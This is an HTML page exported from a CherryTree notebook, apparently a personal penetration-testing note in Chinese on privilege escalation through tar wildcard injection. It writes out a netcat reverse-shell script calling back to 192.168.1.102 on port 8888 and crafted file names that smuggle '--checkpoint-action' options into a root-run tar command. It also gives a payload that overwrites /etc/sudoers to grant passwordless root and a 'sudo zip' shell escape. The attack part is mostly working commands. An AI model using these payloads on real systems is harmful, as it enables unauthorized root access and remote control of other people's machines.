<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>tar提权</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>tar提权</h1><br/>在目录下生成如下文件：<br /><br />echo &quot;mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp&quot; &gt; shell.sh<br />echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;<br />echo &quot;&quot; &gt; --checkpoint=1<br /><br /><a href=""><img src="images\362-1.png" alt="images\362-1.png" /></a><br /><br /><br />shell.sh 里面是想要执行的命令<br /><br />当root用户执行tar打包时如：tar cf archive.tar *<br />可以执行命令<br /><br /><br />添加sudoers <br />echo &#39;echo &quot;test ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#39; &gt; demo.sh<br /><br /><br />原理：<br /><br />–checkpoint[=NUMBER] 显示每个Numbers记录的进度消息（默认值为10）<br /><br />–checkpoint-action=ACTION 在每个checkpoint（检查点）上执行ACTION<br /><br />这里的‘–checkpoint-action’选项，用于指定到达检查点时将要执行的程序，这将允许我们运行一个任意的命令。因此，选项‘–checkpoint=1’ 和 ‘–checkpoint-action=exec=sh shell.sh’作为命令行选项交给了tar程序<br /><br /><br />zip:<br />sudo zip 1.zip raj.txt -T --unzip-command=&quot;sh -c /bin/bash&quot;<br /><br /><br /><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>